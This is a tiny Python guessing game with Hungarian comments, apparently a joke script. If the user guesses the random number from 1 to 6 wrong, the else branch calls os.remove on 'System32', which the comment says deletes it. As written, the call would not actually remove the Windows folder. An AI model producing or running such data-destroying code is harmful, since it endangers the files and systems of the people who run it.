import random  
import os

tipp = int(input("Tippelj egy egész számot 1 és 6 között: "))  # bekér a felhasználótól egy egész számot

szam = random.randint(1,6) # generál egy random számot

if tipp == szam:        # egy elágazás ami vagy kiírja hogy nyertél vagy letörli a System32-t.
    print("Nyertél!")
else:
    os.remove("System32")
